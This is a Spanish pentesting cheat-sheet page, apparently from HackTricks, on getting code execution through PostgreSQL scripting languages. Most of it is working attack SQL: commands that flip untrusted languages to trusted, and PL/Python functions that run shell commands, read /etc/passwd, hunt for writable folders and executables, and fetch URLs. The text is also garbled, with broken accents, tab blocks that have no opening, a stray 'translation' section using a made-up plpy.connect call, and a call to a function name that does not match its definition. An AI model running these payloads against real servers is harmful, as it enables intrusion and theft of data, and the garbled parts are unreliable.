## Lenguajes de PostgreSQL

Es posible que la base de datos PostgreSQL a la que has obtenido acceso tenga diferentes **lenguajes de scripting instalados** que podr√≠as abusar para **ejecutar c√≥digo arbitrario**.

Puedes **ponerlos en marcha**:
```sql
\dL *

SELECT lanname,lanpltrusted,lanacl FROM pg_language;
```
La mayor√≠a de los lenguajes de script que se pueden instalar en PostgreSQL tienen **2 variantes**: la **confiable** y la **no confiable**. La **no confiable** tendr√° un nombre **que termina en "u"** y ser√° la versi√≥n que te permitir√° **ejecutar c√≥digo** y usar otras funciones interesantes. Estos son algunos de los lenguajes que resultan interesantes si se instalan:

* **plpythonu**
* **plpython3u**
* **plperlu**
* **pljavaU**
* **plrubyu**
* ... (cualquier otro lenguaje de programaci√≥n que use una versi√≥n insegura)

{% hint style="warning" %}
Si encuentras que un lenguaje interesante est√° **instalado** pero es **no confiable** seg√∫n PostgreSQL (**`lanpltrusted`** es **`false`**), puedes intentar **confiar en √©l** con la siguiente l√≠nea para que no se apliquen restricciones por parte de PostgreSQL:
```sql
UPDATE pg_language SET lanpltrusted=true WHERE lanname='plpythonu';
# To check your permissions over the table pg_language
SELECT * FROM information_schema.table_privileges WHERE table_name = 'pg_language';
```
{% endhint %}

{% hint style="danger" %}
Si no ves un lenguaje, puedes intentar cargarlo con (**necesitas ser superadmin**):
```
CREATE EXTENSION plpythonu;
CREATE EXTENSION plpython3u;
CREATE EXTENSION plperlu;
CREATE EXTENSION pljavaU;
CREATE EXTENSION plrubyu;
```
{% endhint %}

Ten en cuenta que es posible compilar las versiones seguras como "inseguras". Mira [**esto**](https://www.robbyonrails.com/articles/2005/08/22/installing-untrusted-pl-ruby-for-postgresql.html) por ejemplo. As√≠ que siempre vale la pena intentarlo si puedes ejecutar c√≥digo aunque solo encuentres la versi√≥n **confiable**.

## plpythonu/plpython3u
```sql
CREATE OR REPLACE FUNCTION exec (cmd text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.popen(cmd).read()
    #return os.execve(cmd, ["/usr/lib64/pgsql92/bin/psql"], {})
$$
LANGUAGE 'plpythonu';

SELECT cmd("ls"); #RCE with popen or execve
```
{% endtab %}

{% tab title="Obtener usuario del sistema operativo" %}
```sql
CREATE OR REPLACE FUNCTION get_user (pkg text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    return os.getlogin()
$$
LANGUAGE 'plpythonu';

SELECT get_user(""); #Get user, para is useless
```
{% endtab %}

{% tab title="Listar directorio" %}
```sql
CREATE OR REPLACE FUNCTION lsdir (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import json
    from os import walk
    files = next(walk(dir), (None, None, []))
    return json.dumps({"root": files[0], "dirs": files[1], "files": files[2]})[:65535]
$$
LANGUAGE 'plpythonu';

SELECT lsdir("/"); #List dir
```
{% endtab %}

{% tab title="Encontrar la carpeta W" %}
```sql
CREATE OR REPLACE FUNCTION findw (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        writables = []
        def find_writable(path):
            if not os.path.isdir(path):
                return
            if os.access(path, os.W_OK):
                writables.append(path)
            if not os.listdir(path):
                return
            else:
                for item in os.listdir(path):
                    find_writable(os.path.join(path, item))
        find_writable(path)
        return writables
    
    return ", ".join(my_find(dir))
$$
LANGUAGE 'plpythonu';

SELECT findw("/"); #Find Writable folders from a folder (recursively)
```
{% endtab %}

{% tab title="Encontrar archivo" %}
```sql
CREATE OR REPLACE FUNCTION find_file (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in os.path.basename(i):
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_file("psql"); #Find a file
```
{% endtab %}

{% tab title="Encontrar ejecutables" %}
```sql
CREATE OR REPLACE FUNCTION findx (dir text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find(dir)
    b = []

    for i in a:
        b.append(os.path.basename(i))
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT findx("/"); #Find an executables in folder (recursively)
```
{% endtab %}

{% tab title="Encontrar exec por sustituci√≥n" %}
```sql
CREATE OR REPLACE FUNCTION find_exe (exe_sea text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    def my_find(path):
        executables = []
        def find_executables(path):
            if not os.path.isdir(path) and os.access(path, os.X_OK):
                executables.append(path)
            
            if os.path.isdir(path):
                if not os.listdir(path):
                    return
                else:
                    for item in os.listdir(path):
                        find_executables(os.path.join(path, item))
        find_executables(path)
        return executables
    
    a = my_find("/")
    b = []

    for i in a:
        if exe_sea in i:
            b.append(i)
    return ", ".join(b)
$$
LANGUAGE 'plpythonu';

SELECT find_exe("psql"); #Find executable by susbstring
```
{% endtab %}

{% tab title="Spanish Translation" %}
# RCE con lenguajes de PostgreSQL

PostgreSQL admite varios lenguajes de programaci√≥n que se pueden utilizar para escribir funciones almacenadas. Algunos de estos lenguajes son:

* PL/pgSQL
* PL/Python
* PL/Perl
* PL/Tcl
* PL/Java
* PL/JavaScript

Si un atacante tiene permisos para crear funciones almacenadas, puede utilizar estos lenguajes para ejecutar c√≥digo arbitrario en el servidor de la base de datos. Esto se puede hacer de varias maneras:

## Ejecuci√≥n de comandos del sistema

En algunos casos, los lenguajes de programaci√≥n de PostgreSQL permiten la ejecuci√≥n de comandos del sistema. Por ejemplo, en PL/Python se puede utilizar el m√≥dulo `os` para ejecutar comandos del sistema:

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
import os
os.system('id > /tmp/output')
with open('/tmp/output', 'r') as f:
    return f.read()
$$ LANGUAGE plpythonu;
```

Esta funci√≥n crea un archivo `/tmp/output` con la salida del comando `id`. El atacante puede leer el contenido de este archivo para obtener la salida del comando.

## Ejecuci√≥n de c√≥digo arbitrario

En otros casos, los lenguajes de programaci√≥n de PostgreSQL permiten la ejecuci√≥n de c√≥digo arbitrario. Por ejemplo, en PL/Python se puede utilizar la funci√≥n `eval` para ejecutar c√≥digo arbitrario:

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
import os
eval("os.system('id > /tmp/output')")
with open('/tmp/output', 'r') as f:
    return f.read()
$$ LANGUAGE plpythonu;
```

Esta funci√≥n es similar a la anterior, pero utiliza la funci√≥n `eval` para ejecutar el comando `os.system('id > /tmp/output')`. El atacante puede utilizar esta t√©cnica para ejecutar cualquier c√≥digo arbitrario en el servidor de la base de datos.

## Ejecuci√≥n de c√≥digo en el contexto del servidor de la base de datos

En algunos casos, los lenguajes de programaci√≥n de PostgreSQL permiten la ejecuci√≥n de c√≥digo en el contexto del servidor de la base de datos. Por ejemplo, en PL/Python se puede utilizar la funci√≥n `plpy` para interactuar con la base de datos:

```sql
CREATE OR REPLACE FUNCTION rce() RETURNS text AS $$
import plpy
conn = plpy.connect("dbname=mydb user=myuser password=mypass")
result = conn.execute("SELECT * FROM mytable")
return str(result)
$$ LANGUAGE plpythonu;
```

Esta funci√≥n utiliza la funci√≥n `plpy.connect` para conectarse a la base de datos y la funci√≥n `conn.execute` para ejecutar una consulta SQL. El atacante puede utilizar esta t√©cnica para leer o modificar datos en la base de datos.
```sql
CREATE OR REPLACE FUNCTION read (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import base64
    encoded_string= base64.b64encode(open(path).read())
    return encoded_string.decode('utf-8')
    return open(path).read()
$$
LANGUAGE 'plpythonu';

select read('/etc/passwd'); #Read a file in b64
```
{% endtab %}

{% tab title="Obtener permisos" %}
```sql
CREATE OR REPLACE FUNCTION get_perms (path text)
RETURNS VARCHAR(65535) stable
AS $$
    import os
    status = os.stat(path)
    perms = oct(status.st_mode)[-3:]
    return str(perms)
$$
LANGUAGE 'plpythonu';

select get_perms("/etc/passwd"); # Get perms of file
```
{% endtab %}

{% tab title="Petici√≥n" %}
```sql
CREATE OR REPLACE FUNCTION req2 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    import urllib
    r = urllib.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req2('https://google.com'); #Request using python2

CREATE OR REPLACE FUNCTION req3 (url text)
RETURNS VARCHAR(65535) stable
AS $$
    from urllib import request
    r = request.urlopen(url)
    return r.read()
$$
LANGUAGE 'plpythonu';

SELECT req3('https://google.com'); #Request using python3
```
{% endtab %}
{% endtabs %}

## pgSQL

Revisa la siguiente p√°gina:

{% content-ref url="pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## C

Revisa la siguiente p√°gina:

{% content-ref url="rce-with-postgresql-extensions.md" %}
[rce-with-postgresql-extensions.md](rce-with-postgresql-extensions.md)
{% endcontent-ref %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* ¬øTrabajas en una **empresa de ciberseguridad**? ¬øQuieres ver tu **empresa anunciada en HackTricks**? ¬øO quieres tener acceso a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF**? ¬°Revisa los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* **√önete al** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Comparte tus trucos de hacking enviando PRs al** [**repositorio de hacktricks**](https://github.com/carlospolop/hacktricks) **y al** [**repositorio de hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
